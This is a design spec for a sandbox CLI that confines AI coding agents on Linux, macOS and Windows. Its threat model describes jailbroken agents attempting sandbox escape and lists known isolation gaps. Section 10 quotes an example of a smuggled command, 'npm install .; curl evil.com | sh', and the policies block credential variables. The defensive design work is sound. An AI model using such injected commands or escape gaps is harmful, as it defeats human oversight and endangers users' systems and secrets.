# `cage` — Cross-Platform AI Agent Sandbox CLI

**Version:** 0.1 (draft)
**Status:** Design spec

---

## 1. Overview

`cage` is a CLI wrapper that runs any command (AI coding agents, build tools, scripts, etc.) in OS-native sandboxes. It restricts filesystem reads/writes, controls network access, and isolates configuration — all without containers or VMs, preserving the host toolchain and filesystem layout.

```
cage opencode
cage --policy strict claude
cage --allow-network codex
cage --policy strict aider
cage --policy strict ./build.sh
cage python script.py
```

### Goals

- Restrict reads/writes based on configurable policies; operate on the same filesystem as the host (same paths, no containers)
- Pass through only explicitly declared configs (SSH keys, gitconfig, environment variables)
- Expose MCP sockets into the sandbox
- Prevent writes outside allowed paths and reads of sensitive host paths
- Preserve the full host toolchain (compiler, SDK, language runtimes)
- Work on Linux, macOS, and Windows
- Sub-second startup overhead

### Non-goals

- Container/VM-level isolation (use Docker or Firecracker if you need a kernel boundary)
- Protecting against hostile, kernel-exploit-capable attackers
- Replacing application-level approval/permission systems

---

## 2. Threat Model

The target threat is a **process that is confused, buggy, misconfigured, or deliberately misled** — not a sophisticated attacker with kernel-exploit capability.

AI agents may be jailbroken or deliberately prompted to escape the sandbox. We defend against deliberate but non-sophisticated escape attempts (filesystem tricks, network exfiltration, path probing). We do not defend against kernel exploits or advanced persistent threats—use VMs or containers for that level of isolation.

| Threat | Linux | macOS | Windows |
|---|---|---|---|
| Writes outside allowed paths | ✅ bubblewrap | ✅ Seatbelt | ✅ ACLs (with caveats) |
| Reads sensitive paths (e.g., `~/.ssh`) | ✅ bubblewrap | ✅ Seatbelt (see §5.2) | ✅ ACLs |
| Exfiltrates data over network | ✅ bubblewrap + seccomp | ✅ Seatbelt | ✅ WFP firewall rules |
| Modifies shell config / crontab | ✅ | ✅ | ✅ |
| Installs persistent malware | ✅ | ✅ | ⚠️ `%TEMP%` gap (see §5.3) |

**What this does NOT protect against:**

- Kernel exploits (all OS-native sandboxes share the host kernel)
- Side-channel or timing attacks
- Social engineering (process asking the user to run commands outside the sandbox)
- MCP server compromise (out of scope)
- macOS Seatbelt silent degradation on future OS versions

**Known limitations and mitigations:**

| Gap | Detail | Mitigation |
|---|---|---|
| Symlink/TOCTOU on macOS/Windows | Seatbelt and Windows ACLs may follow symlinks to paths outside the sandbox. | Bubblewrap on Linux uses mount namespaces (immune). macOS/Windows: accepted risk for the "confused process" threat model. |
| /proc isolation on Linux | Sandboxed process could introspect host processes via /proc. | Bubblewrap creates a new PID namespace by default—the sandboxed process sees only its own process tree in /proc, not host PIDs. |
| Docker socket (`/var/run/docker.sock`) | A process with write access to the Docker socket can spawn containers with host mounts, escaping the sandbox. | Connecting to a Unix socket requires write permission on the socket file. Since `/var/run/docker.sock` is not in any writable root, this is blocked by default. |
| Windows `%TEMP%` gap | Directories where `Everyone` has write access cannot be blocked by restricted token + ACLs. | Accepted limitation. WFP firewall blocks exfiltration. Temp dir cleaned on exit. See §5.3 and §13. |
| Bubblewrap user namespace requirement | Some enterprise/container environments disable unprivileged user namespaces. | cage requires either unprivileged user namespaces or a setuid `bwrap` binary. Clear error message if unavailable. |

---

## 3. Architecture

### 3.1 Repository layout

```
cage/
├── src/
│   ├── main.rs               # CLI entry point, arg parsing
│   ├── config.rs             # Policy loading and merging
│   ├── cli.rs                # CLI argument definitions
│   ├── policy/               # Policy definitions
│   │   ├── mod.rs
│   │   ├── types.rs          # Policy structs and enums
│   │   └── merge.rs          # Policy composition logic
│   └── platform/
│       ├── mod.rs            # Platform detection, dispatch
│       ├── linux.rs          # bubblewrap launcher + seccomp filter
│       ├── macos.rs          # Seatbelt profile generator + sandbox-exec
│       └── windows.rs        # Restricted Token + ACL + WFP firewall
├── config/
│   └── cage.toml             # Bundled defaults
└── Cargo.toml
```

### 3.2 Execution flow

```
$ cage opencode

1.  Detect OS and capabilities (bwrap availability, user namespace support)
2.  Load and merge policy:
      ~/.config/cage/cage.toml          (user config)
      .cage.toml                        (project override, if present)
      CLI flags                         (highest precedence)
      Policy selection:
        - If `--policy <name>` is specified, use that policy
        - Else if command matches a `command_policy` pattern, use mapped policy
        - Else use "default" policy (or fail if no default exists)
3.  Prepare environment:
      - Create temp dir: /tmp/cage-$PID-$RANDOM/ (PID for traceability, random suffix for security)
      - Copy/symlink declared passthrough configs (read-only)
      - Set up environment variables based on policy
4.  Platform-specific sandbox setup:
      Linux:   build bwrap command with bind mounts + seccomp filter
      macOS:   generate Seatbelt profile string → write to temp file
      Windows: create restricted token, set ACLs, install WFP rules
5.  exec(agent) with:
      CWD            = current working directory (read-write, if in policy)
      HOME           = user home directory (same as host)
      Environment    = filtered per policy (allowlist/blocklist mode + forced overrides)
      MCP socket     = passed through (Unix socket / named pipe)
6.  On exit:
      Linux/macOS: temp dir cleaned up, namespace/Seatbelt auto-released on process exit
      Windows:     WFP rules removed, ACLs restored, temp dir cleaned
      Exit code     = forwarded from the sandboxed process
```

---

## 4. Policy System

### 4.1 Policy config format

```toml
# ~/.config/cage/cage.toml

# ── Named policies ──────────────────────────────────────────────────────────

[policies.default]
writable_roots = ["$CWD", "$TMPDIR", "~/.cache"]
write_restricted_paths = ["$CWD/.git", "$CWD/.env", "~/.ssh", "~/.gnupg", "~/.aws", "~/.config"]
read_restricted_paths = ["~/.ssh", "~/.aws", "~/.gnupg"]  # Block common secret paths; add more gradually
network = "full"
[policies.default.env]
mode = "blocklist"
block = ["*_TOKEN", "*_SECRET", "*_PASSWORD", "*_API_KEY", "AWS_*", "GITHUB_*"]
set = { CAGE = "1" }

[policies.strict]
writable_roots = ["$CWD"]
write_restricted_paths = ["$CWD/.git", "$CWD/.env"]
read_restricted_paths = ["~/.ssh", "~/.aws", "~/.config", "~/.gnupg"]
network = "none"
[policies.strict.env]
mode = "allowlist"                    # "allowlist" | "blocklist"
allow = ["PATH"]                      # for allowlist mode: only these vars
# block = ["SECRET_*"]                # for blocklist mode: exclude these
set = { CAGE = "1" }                  # always set these

# Phase 3: Domain-filtered network access (via built-in proxy)
# [policies.web-build]
# writable_roots = ["$CWD"]
# network = { type = "proxy", allowed_domains = ["github.com", "npmjs.com", "registry.npmjs.org"] }
# [policies.web-build.env]
# mode = "allowlist"
# allow = ["PATH", "NODE_ENV"]
# set = { CAGE = "1" }

#### Variable expansion

Path values in the config support variable expansion:

| Variable | Description |
|----------|-------------|
| `$CWD` | **Runtime-computed** - the current working directory where `cage` was invoked |
| `$VAR` | Environment variable lookup (platform-specific names) |
| `~` | Home directory (expanded via standard shell rules) |

**No cross-platform mapping:** Use platform-specific environment variable names. For example:

```toml
# Unix example
writable_roots = ["$CWD", "~/.cache", "$TMPDIR", "$XDG_CACHE_HOME"]

# Windows example
writable_roots = ["$CWD", "~\\.cache", "$TEMP", "$LOCALAPPDATA"]
```

Variables are resolved at policy application time. If an environment variable is not set, the path item is removed from the list (not an error).

# ── Command to policy mappings ───────────────────────────────────────────────
# Map specific commands to default policies. The first matching pattern is used.
# Patterns are checked in order. If no match, the "default" policy is used.
#
# Pattern matching rules:
# - Matches against the basename (filename only, no directory)
# - Extension is stripped (.exe, .cmd, .bat on Windows; no extension elsewhere)
# - Supports glob wildcards: * matches any sequence, ? matches single char
#
# Examples:
#   pattern = "opencode"    matches: opencode, opencode.exe, /usr/bin/opencode, C:\tools\opencode.exe
#   pattern = "python*"     matches: python, python3, python.exe, python3.11.exe
#   pattern = "node"        matches: node, node.exe

[[command_policy]]
pattern = "opencode"
policy = "default"

[[command_policy]]
pattern = "codex"
policy = "default"

[[command_policy]]
pattern = "claude"
policy = "default"

[[command_policy]]
pattern = "aider"
policy = "strict"

# ── Platform-specific overrides ──────────────────────────────────────────────

[platform.linux]
fail_on_sandbox_error = true

[platform.macos]
fail_on_sandbox_error = true    # set false to warn-and-continue if Seatbelt profile breaks

[platform.windows]
cage_group = "CageUsers"
```

### 4.2 Policy merge semantics (Phase 2)

> **Note:** Policy composition is a Phase 2 feature. In Phase 1, only a single policy name is supported via `--policy <NAME>`.

Multiple named policies can be composed with `+`:

```
cage --policy default+strict opencode
```

Merge rules (permitting mode — merging adds permissions):
- `writable_roots`: **union** (all writable paths from merged policies)
- `write_restricted_paths`: **intersection** (only restrict if ALL policies agree)
- `read_restricted_paths`: **intersection** (only restrict if ALL policies agree)
- `network`: **most permissive wins** (`full` > `localhost` > `none`)
- `env.mode`: if any policy uses `blocklist`, result is `blocklist` (more permissive); otherwise `allowlist`
- `env.allow`: **union** (all allowed vars from merged policies)
- `env.block`: **intersection** (only block if ALL policies agree)
- `env.set`: **union** (later policies override earlier for same keys)

**Merge principle:** In permitting mode, merged policies combine their allowances. Restrictions use intersection (more permissive), permissions use union (more permissive).

### 4.3 Network policy levels

| Level | What's allowed |
|---|---|
| `none` | No outbound connections of any kind |
| `localhost` | `127.0.0.1`, `::1`, Unix domain sockets (MCP) |
| `proxy` | Localhost + outbound to specific domains only (via built-in filtering proxy, Phase 3) |
| `full` | Unrestricted outbound |

### 4.4 Policy type definitions (Rust)

```rust
pub struct SandboxPolicy {
    pub name: String,
    pub writable_roots: Vec<PathBuf>,
    pub write_restricted_paths: Vec<PathBuf>,  // subpaths blocked from writing within writable roots
    pub read_restricted_paths: Vec<PathBuf>,   // paths blocked from reading
    pub network: NetworkPolicy,
    pub env: EnvPolicy,
}

pub enum NetworkPolicy {
    None,
    Localhost,
    Proxy { allowed_domains: Vec<String> },  // Phase 3: domain filtering via built-in proxy
    Full,
}

pub enum EnvMode {
    Allowlist,   // Only vars in `allow` are passed through
    Blocklist,   // All vars except those in `block` are passed through
}

pub struct EnvPolicy {
    pub mode: EnvMode,
    pub allow: Vec<String>,            // glob patterns for allowlist mode
    pub block: Vec<String>,            // glob patterns for blocklist mode
    pub set: HashMap<String, String>,  // forced overrides, always applied
}

pub enum MultiPolicy {
    Single(SandboxPolicy),
    Merged(Vec<SandboxPolicy>),
}

impl MultiPolicy {
    pub fn resolve(&self) -> SandboxPolicy { /* merge per §4.2 */ }
}

pub struct CommandPolicy {
    pub pattern: String,     // command name or glob pattern to match
    pub policy: String,      // name of the policy to apply
}

pub struct Config {
    pub policies: HashMap<String, SandboxPolicy>,
    pub command_policy: Vec<CommandPolicy>,  // ordered list, first match wins
    pub platform: PlatformConfig,
}

impl Config {
    /// Find the default policy for a given command.
    /// Matches against basename (filename only) with extension stripped.
    /// Supports glob patterns (* and ?).
    pub fn default_policy_for(&self, command: &str) -> Option<&str> {
        let basename = std::path::Path::new(command)
            .file_stem()?  // Remove directory and extension (.exe, etc.)
            .to_str()?;
        self.command_policy
            .iter()
            .find(|cp| glob_match(&cp.pattern, basename))
            .map(|cp| cp.policy.as_str())
    }
}
}
```

---

## 5. Platform Implementations

### 5.1 Linux: bubblewrap + seccomp

**Requirements:** `bwrap` binary installed (packaged as `bubblewrap` in most distros). Unprivileged user namespaces enabled (default on most desktop Linux) or setuid `bwrap` binary.

**Why bubblewrap over Landlock:** Landlock is allow-only — a rule on a parent directory grants access to all children. This means `write_restricted_paths` (e.g., "allow `$CWD` but deny `$CWD/.git`") cannot be implemented without breaking new file creation in the writable root. Bubblewrap handles this natively via `--ro-bind` overlays within `--bind` mounts.

**How it works:** Build a `bwrap` command at runtime based on the resolved policy, then exec it via `std::process::Command`. No library API exists for bubblewrap — it is CLI-only.

**Filesystem setup:**

```sh
bwrap \
  --ro-bind / / \                           # read-only base (entire filesystem)
  --dev /dev \                              # device nodes
  --proc /proc \                            # /proc filesystem
  --bind $CWD $CWD \                        # writable root (from policy)
  --ro-bind $CWD/.git $CWD/.git \           # write_restricted_paths (read-only overlay)
  --bind /tmp/cage-$PID /tmp/cage-$PID \    # session temp dir (writable)
  -- agent
```

- `--ro-bind / /` makes the entire filesystem read-only by default
- `--bind $path $path` for each entry in `writable_roots` (grants read-write)
- `--ro-bind $path $path` for each entry in `write_restricted_paths` — overlays a read-only mount on top of a writable parent, preventing writes to that subpath while keeping it readable
- `--dev /dev` and `--proc /proc` for device nodes and process info
- All paths remain at their original locations (no remapping by default)

**PID namespace:** Bubblewrap creates a new PID namespace by default (via `--unshare-pid` implicit). The sandboxed process sees only its own process tree in `/proc`, not host PIDs. This prevents `/proc` introspection of host processes.

**Network setup:**

| Policy level | Bubblewrap flags | Seccomp | Effect |
|---|---|---|---|
| `none` | `--unshare-net` | None needed | Isolated network namespace with only its own loopback. No host network access. |
| `localhost` | `--share-net` | `SECCOMP_RET_USER_NOTIF` on `connect()` | Host network shared, but seccomp supervisor inspects every `connect()` call via `/proc/pid/mem`, allowing only `127.0.0.1`/`::1`/`AF_UNIX` and blocking all other destinations. |
| `full` | `--share-net` | None | Unrestricted host network access. |

**Seccomp for `localhost` policy (Phase 1b):** Uses `SECCOMP_RET_USER_NOTIF` (Linux ≥ 5.0) to intercept `connect()` syscalls. The supervisor process reads the target's sockaddr from `/proc/pid/mem`, checks the address family and destination, and allows only loopback addresses and Unix domain sockets. This is passed to bwrap via the `--seccomp` flag with a pre-built BPF program. Note: seccomp cannot inspect sockaddr directly (it's behind a pointer) — the userspace supervisor is required for destination-level filtering.

**MCP sockets:** Bind-mount Unix socket paths into the namespace:
```sh
--bind /run/mcp/server.sock /run/mcp/server.sock
```

Note: Unix domain sockets require write permission to connect. Use `--bind` (read-write), not `--ro-bind`.

**Degradation:** If unprivileged user namespaces are disabled and `bwrap` is not setuid, exit with a clear error message suggesting the user either enable user namespaces or install a setuid `bwrap`.

**Alternatives evaluated (not planned for implementation):**

| Option | Verdict |
|---|---|
| Landlock (kernel ≥ 5.13) | Fast, no external deps, but cannot deny subpaths within allowed parents. Viable future fallback for systems without user namespaces if `write_restricted_paths` is not needed. |
| Firejail | Separate tool with its own profile format and security model. Adds complexity without clear benefit over bubblewrap. |
| Direct namespace syscalls | Same capability as bubblewrap but reimplemented in Rust (~2000 lines). Higher maintenance burden for no functional gain. |

### 5.2 macOS: Seatbelt (`sandbox-exec`)

**Status:** `sandbox-exec` is marked deprecated in the man page since macOS 10.12, but the underlying kernel subsystem ("Seatbelt") powers all Apple system software and all major browsers. Claude Code, Codex CLI, and Cursor all use it in production as of 2025–2026. The SBPL profile language is the only viable lightweight option for macOS processes today.

**How it works:** Generate an SBPL profile string at runtime based on `$CWD` and declared policy, then exec the agent via `/usr/bin/sandbox-exec -p "$PROFILE" agent`.

**Security note:** Always use the hardcoded path `/usr/bin/sandbox-exec` (not just `sandbox-exec` from PATH). This defends against an attacker trying to inject a malicious version of the executable. If `/usr/bin/sandbox-exec` has been tampered with, the attacker already has root access.

**Profile template (generated at runtime):**

```scheme
(version 1)
(allow default)

; ── Filesystem write restrictions ──────────────────────────────────────────
(deny file-write* (subpath "/"))
(allow file-write*
  (subpath "/path/to/project")          ; $CWD
  (subpath "/private/tmp")
  (subpath "/tmp"))

; Read-restricted paths (deny read access to sensitive directories)
; (deny file-read* (subpath "/home/user/.ssh"))
; (deny file-read* (subpath "/home/user/.aws"))

; ── Network restrictions ────────────────────────────────────────────────────
(deny network-outbound)
(allow network-outbound
  (remote unix-socket)                   ; MCP sockets
  (remote ip "localhost:*"))             ; localhost only (MCP HTTP, git over local proxy)

; ── For --allow-network mode, replace above with: ──────────────────────────
; (allow network*)
```

**Key constraints:**
- The profile **must be generated at runtime**. Static profiles don't work because writable paths include `$CWD` which is only known at invocation time.
- **TODO:** Properly escape `$CWD` and other paths when substituting into SBPL profile. Research SBPL escaping rules during implementation (special characters like `)`, `"`, `\` could inject rules).
- The `(allow default)` at the top means reads are allowed everywhere by default. Specific paths can be blocked with `(deny file-read*)` rules, which is how `read_restricted_paths` is implemented. This works well for blocking sensitive directories like `~/.ssh` while allowing general filesystem access.
- **`write_restricted_paths`:** Implemented via `(deny file-write* (subpath "..."))` rules placed after the `(allow file-write* ...)` rules. In Seatbelt, later deny rules override earlier allows, so this works natively.

**Alternatives evaluated and rejected:**

| Option | Verdict |
|---|---|
| App Sandbox (entitlements) | Requires code signing + notarization. Not applicable to arbitrary CLI wrappers. |
| Apple Containerization (`apple/container`, macOS 26) | Runs **Linux** containers only. Cannot sandbox macOS-native processes (Xcode, Metal, etc.). |
| Virtualization.framework (Tart, Lume) | Full macOS VM, 5–30s startup, high RAM. Breaks host toolchain. |
| Alcoholless (separate macOS user) | User-level isolation only, weaker guarantees, complex setup. |

### 5.3 Windows: Restricted Token + ACLs + WFP Firewall

Based on the approach OpenAI open-sourced in `codex-rs/windows-sandbox-rs/` (merged March 2026, PR #4905). This is the first production-validated, open-source Windows agent sandbox.

**Three-layer mechanism:**

**Layer 1 — Restricted Token**
- `CreateRestrictedToken()` strips dangerous SIDs and privileges from the current token
- The agent process runs with a reduced identity
- Cannot access resources requiring the user's standard SID

**Layer 2 — NTFS ACLs**
- Explicit ACEs grant write access to `$CWD` for the sandbox SID
- Rest of the filesystem implicitly denies writes (restricted token cannot authenticate)
- Caveat: directories where `Everyone` has write access (e.g., `%TEMP%`, some shared folders) cannot be blocked by ACLs alone. This is an accepted limitation — WFP firewall rules remain the primary control for preventing data exfiltration via these paths.
- **`write_restricted_paths`:** Implemented via explicit deny ACEs, which take precedence over allow ACEs in Windows security evaluation. This works natively.

**Layer 3 — Windows Filtering Platform (WFP) Firewall Rules**
- Outbound network blocked via WFP rules scoped to the sandbox user SID
- Localhost still reachable (MCP sockets, local git proxy)

**One-time setup (requires admin, run once at install time):**
```
cage-setup.exe
  Creates: SandboxUsers local group
  Creates: Dedicated sandbox user account
  Configures: Baseline WFP rules
```

**Runtime (no admin needed):**
```
CreateRestrictedToken(current_token, strip=[dangerous SIDs])
Set ACLs: GRANT SandboxSID full-control on $CWD
Add WFP rule: BLOCK outbound for SandboxSID
CreateProcessWithToken(restricted_token, "agent.exe ...")
[on exit]: Remove WFP rule, clean up ACLs
```

**Signal handling:** Unlike Linux/macOS where `exec()` replaces the cage process, on Windows `CreateProcessWithToken` keeps cage as the parent process. Explicit signal forwarding (Ctrl+C, Ctrl+Break) must be implemented to properly terminate the sandboxed process.

**Implementation approach:** Implement our own Windows sandbox module based on this approach. The `windows-sandbox-rs` crate depends on internal Codex workspace crates (`codex-protocol`, `codex-utils-absolute-path`, etc.) that are not published to crates.io, so we cannot vendor just `lib.rs`. Instead, write our own module using the Windows APIs directly:

- `windows` crate (v0.58) for `CreateRestrictedToken`, ACL functions, WFP APIs
- `windows-sys` crate (v0.52) for lower-level system calls
- Reference their implementation (~500 lines) for the approach, but use our own `SandboxPolicy` type

**TODOs for implementation:**
- **WFP SID scoping:** Research Codex `windows-sandbox-rs` implementation for proper SID scoping. The restricted token uses the same user SID as the normal user; WFP must distinguish sandboxed vs unsandboxed processes.
- **Concurrent sessions:** Research how to handle multiple concurrent cage sessions. May need unique session SIDs (via `SidsToRestrict`) so WFP rules don't conflict between sessions.

**Alternatives rejected:**

| Option | Verdict |
|---|---|
| Windows Sandbox (WSB) | Full Hyper-V VM with a separate Windows install. Cannot use host MSVC/Win32 SDK. |
| AppContainer | Requires app to declare capabilities via manifest. Cannot wrap arbitrary CLI tools. |
| WSL2 | Different kernel, different filesystem view. Breaks Windows-native toolchains. |

---

## 6. Environment Isolation

`cage` isolates the running command from the host environment by:
1. Filtering environment variables based on policy (allowlist/blocklist)
2. Creating a temporary directory for session state (logs, caches)
3. Respecting the user's actual `HOME` directory (not remapped)

### 6.1 Session temporary directory

Each `cage` session creates a temporary directory (`/tmp/cage-$PID-$RANDOM/`) for session-specific state. This is **not** the `HOME` directory — the user's real home remains accessible at its normal path. The session directory can be used for:
- Audit logs of denied accesses
- Temporary caches that shouldn't persist
- Debug output

```
/tmp/cage-$PID-$RANDOM/
├── audit.log                   # log of policy violations
├── cache/                      # ephemeral cache dir
└── ...                         # other session-specific files
```

**Note:** `HOME` environment variable remains pointing to the user's actual home directory. The sandbox restricts access via OS-level mechanisms (bubblewrap/Seatbelt/ACLs), not by remapping paths. Use `XDG_CONFIG_HOME` or application-specific env vars if you need to redirect config locations.

### 6.2 Environment variable handling

Environment variables are filtered using one of two modes:

| Mode | Behavior | Use case |
|---|---|---|
| `allowlist` | Only variables matching `env.allow` patterns are passed through | Maximum security - explicit opt-in |
| `blocklist` | All variables except those matching `env.block` are passed through | Convenient - only exclude sensitive vars |

To pass through all environment variables, use `mode = "blocklist"` with an empty `block` list.

In all modes, `env.set` variables are always applied after filtering and override any inherited values.

Example policies:
```toml
# Maximum security - only allow specific vars
[policies.strict.env]
mode = "allowlist"
allow = ["PATH", "TERM"]
set = { CAGE = "1" }

# Exclude sensitive credentials only
[policies.default.env]
mode = "blocklist"
block = ["*_TOKEN", "*_SECRET", "*_PASSWORD", "AWS_*"]
set = { CAGE = "1" }
```

---

## 7. MCP Socket Passthrough

MCP servers communicate over Unix domain sockets (Linux/macOS) or named pipes (Windows). These must be accessible from inside the sandbox.

**Linux (bubblewrap):** Bind-mount the socket path into the namespace:
```sh
--bind /run/mcp/server.sock /run/mcp/server.sock
```
The seccomp filter (when used for `localhost` network policy) explicitly allows `AF_UNIX` connections.

**TODO:** Research MCP socket path discovery mechanism. Currently using hardcoded path for Phase 1.

**macOS (Seatbelt):** The profile includes `(allow network-outbound (remote unix-socket))`. The socket path must also be readable (allowed by `(allow default)`).

**Windows:** Named pipes are accessible by SID. The restricted token retains access to named pipes created by the parent process. No special configuration needed for in-process MCP.

---

## 8. Path Handling

`cage` operates on the host filesystem directly using OS-native mechanisms (bubblewrap bind mounts, Seatbelt, Windows ACLs). All paths accessible inside the cage are at the same location as on the host (no remapping by default).

| Mechanism | Same filesystem? | Path remapping? |
|---|---|---|
| bubblewrap (Linux) | ✅ Yes | ✅ Yes (optional, not used by default) |
| Seatbelt (macOS) | ✅ Yes | ❌ No |
| Windows restricted token + ACLs | ✅ Yes | ❌ No |

This design preserves the full host toolchain and ensures that:
- Absolute paths work identically inside and outside the cage
- Native platform toolchains (Xcode, MSVC, etc.) work without modification
- Sub-second startup overhead (bubblewrap namespace setup is lightweight)

---

## 9. CLI Interface

```
USAGE:
    cage [OPTIONS]... <COMMAND> [ARGS]...

ARGS:
    <COMMAND>        Command to run (any executable)
    [ARGS]...        Arguments to pass to the command

OPTIONS:
    -p, --policy <NAME>             Named policy (default: "default"). Phase 2: supports NAME+NAME composition.
        --allow-network             Shorthand: use current policy but override network to "full"
        --no-sandbox                Run command unsandboxed (logs a warning)
        --config <PATH>             Use alternative config file instead of ~/.config/cage/cage.toml
        --passthrough <PATH>        Add an extra read-only passthrough path (repeatable)
        --writable <PATH>           Add an extra writable root (repeatable)
        --write-restrict <PATH>     Add an extra write-restricted path (repeatable)
        --read-restrict <PATH>      Add an extra read-restricted path (repeatable)
    -v, --verbose                   Show sandbox configuration before exec
        --dry-run                   Print the sandbox config and generated profile, don't exec
    -h, --help                      Print help
    -V, --version                   Print version

EXAMPLES:
    cage opencode                       # Uses 'default' policy (from command_policy mapping)
    cage --allow-network claude         # Uses 'default' policy + adds network access
    cage --policy strict codex          # Overrides default, uses 'strict' policy
    cage --policy strict ./build.sh
    cage --no-sandbox npm test
```

---

## 10. Sandbox Escape Hatch (Phase 3)

**Use case:** Allow agents to request execution of commands outside the sandbox for global operations (system package installs, global tool configuration, accessing credentials outside the project directory).

**Two MCP tools:**
- `escape_bash` - Execute command outside sandbox; approval via user-defined pattern matching (with optional enhanced safety checks), or explicit user prompt
- `escape_bash_ask` - Always prompts user for approval (no auto-approve, regardless of pattern matching rules)

**Design intent:** Agents should prefer regular sandboxed execution. Escape is a last resort for operations that genuinely cannot work inside the sandbox (e.g., system package installs, global tool configuration). Agents should not routinely use escape for convenience.

**Security:** All escape calls are logged regardless of approval method. Each call is limited to a single command execution. Full host access when approved.

**Pattern matching note:** Auto-approve patterns must be carefully designed. Glob patterns (e.g., `npm install *`) can be dangerous—an agent could run `npm install .; curl evil.com | sh`. Recommend exact-match patterns where possible.

**Enhanced safety checks:** Beyond simple pattern matching, an optional "smart safety check" layer (e.g., semantic analysis, command structure validation) could provide additional protection. **TODO:** Design enhanced safety check mechanism for Phase 3.

---

## 11. Implementation Roadmap

*Note: With agent coding assistance, Phase 1 can be completed in 5-7 weeks total (4-5 weeks for Phase 1a+1b).*

### Phase 1a — Core Platforms (Weeks 1-3)

- [ ] Policy config loading and merging
- [ ] Command-to-policy mappings (`command_policy` config)
- [ ] Environment setup and temp dir isolation (§6)
- [ ] Linux: bubblewrap launcher with bind mounts (network: `none` and `full` only)
- [ ] Linux: MCP socket passthrough
- [ ] macOS: Seatbelt profile generator + `sandbox-exec` exec
- [ ] macOS: MCP socket passthrough
- [ ] CLI interface and default policy
- [ ] Variable expansion ($CWD, $VAR)
- [ ] Integration tests: verify write_restricted_paths denies writes
- [ ] Integration tests: verify network policies block/allow correctly
- [ ] Integration tests: verify read_restricted_paths denies reads

### Phase 1b — Windows + Localhost Network (Weeks 4-5)

- [ ] Linux: seccomp `SECCOMP_RET_USER_NOTIF` supervisor for `localhost` network policy
- [ ] Windows: Restricted Token implementation
- [ ] Windows: ACL management layer
- [ ] Windows: WFP firewall integration
- [ ] Windows: `cage-setup.exe` installer (one-time, requires admin)
- [ ] Windows: Testing and validation
- [ ] Windows: MCP socket passthrough
- [ ] Cleanup on exit (temp dirs, Windows firewall rules)
- [ ] Integration tests for Windows sandbox

### Phase 2 — Enhanced Features (Weeks 6-7)

- [ ] Policy composition (`--policy a+b`)
- [ ] Config validation (detect conflicting settings)
- [ ] Structured audit log of denied accesses

### Phase 3 — Advanced (Future)

- [ ] Linux: Landlock backend as lightweight alternative for systems without user namespaces (accepting no `write_restricted_paths` support)
- [ ] Network allowlist proxy mode (`network = "proxy"`) — route outbound through a domain-filtering HTTP proxy, similar to Claude Code's approach
- [ ] macOS Containerization (macOS 26+): Linux container mode for agents that only need Linux toolchain (Node/Python/Go/Rust); not suitable for Xcode/iOS work
- [ ] VM mode (`--isolation=vm`): Firecracker microVM for highest assurance; ~1–2s startup; suitable for CI
- [ ] Sandbox escape hatch (`escape_bash`, `escape_bash_ask` MCP tools) — allow agents to request command execution outside sandbox with approval

---

## 12. Dependency Strategy

### Use published crates (do not vendor from Codex)

```toml
[target.'cfg(target_os = "linux")'.dependencies]
seccompiler = "0.4"      # Phase 1b: seccomp-BPF for SECCOMP_RET_USER_NOTIF on connect() (localhost network policy)
# bwrap (bubblewrap) is a runtime dependency, not a Rust crate — invoked via std::process::Command
# Phase 1a has no Linux-specific Rust crate dependencies

[target.'cfg(target_os = "windows")'.dependencies]
windows = { version = "0.58", features = [
    "Win32_Security",
    "Win32_System_Threading",
    "Win32_NetworkManagement_WindowsFilteringPlatform",
]}
```

macOS requires no crate — Seatbelt is just `std::process::Command::new("sandbox-exec")`.

Linux requires `bwrap` installed on the system — invoked via `std::process::Command::new("bwrap")`.

### Windows implementation

Implement our own Windows sandbox module using the `windows` and `windows-sys` crates. Reference the approach in `codex-rs/windows-sandbox-rs/` for the three-layer mechanism (restricted token, ACLs, WFP), but write our own code rather than vendoring (the Codex crate depends on internal workspace crates not available on crates.io).

### Why not use Codex crates directly

- `codex-linux-sandbox`: binary-only crate, no `[lib]` target, not published. Also uses Landlock which cannot implement `write_restricted_paths`.
- `codex-core` (contains Landlock + Seatbelt code): not published to crates.io, internal API, couples you to OpenAI's `SandboxPolicy` type
- `codex-windows-sandbox`: has a `pub fn run_windows_sandbox_capture` but is not published; git dependency is fragile as OpenAI refactors internals

---

## 13. Security Notes

### Environment variable injection

Environment variables set via `.env` files or other mechanisms in the working directory cannot override the isolated environment that `cage` establishes. The cage sets `HOME` and other critical variables explicitly in the spawned process environment before exec, and these cannot be overridden by the command reading configuration files.

### Windows `%TEMP%` gap

Directories where `Everyone` has write access (notably `%TEMP%` and some shared folders) cannot be blocked by the restricted token + ACL approach because the write permission is granted independently of SID. This is an accepted limitation of the Windows approach (shared with Codex's implementation). The WFP firewall rules remain the primary control for preventing data exfiltration. For persistence risk (malicious files surviving the sandbox session), the temp directory is cleaned up on exit as best-effort.

### Credential passthrough hygiene

- SSH private keys: not passed through by default
- API keys: in `allowlist` mode, only explicitly allowed vars are passed through; in `blocklist` mode, use `env.block` patterns to exclude sensitive credentials
- Config files: passed through read-only; originals are never made writable

**Recommended practice**: Use `allowlist` mode for production/CI, explicitly listing only required environment variables. Use `blocklist` mode for local development with convenient exclusion patterns like `["*_TOKEN", "*_SECRET", "AWS_*", "GITHUB_*"]`.

---

## 14. References

- bubblewrap: https://github.com/containers/bubblewrap
- `seccompiler` crate: https://crates.io/crates/seccompiler
- Codex Linux sandbox (Landlock-based, for reference): `openai/codex` → `codex-rs/linux-sandbox/` and `codex-rs/core/src/landlock.rs`
- Codex macOS Seatbelt: `openai/codex` → `codex-rs/core/src/seatbelt.rs`
- Codex Windows sandbox: `openai/codex` → `codex-rs/windows-sandbox-rs/src/lib.rs` (PR #4905, merged Mar 2026)
- Landlock kernel docs (alternative backend, Phase 3): https://docs.kernel.org/userspace-api/landlock.html
- Apple Containerization (macOS 26, Linux containers only): https://github.com/apple/container
- Claude Code `CLAUDE_CONFIG_DIR` behavior: https://github.com/anthropics/claude-code/issues/3833
- opencode `OPENCODE_CONFIG` limitation (agents not loading): https://github.com/sst/opencode/issues/3432
- opencode XDG support: https://github.com/sst/opencode/issues/6669
- Codex `CODEX_HOME` injection CVE: https://www.csoonline.com/article/4100632/
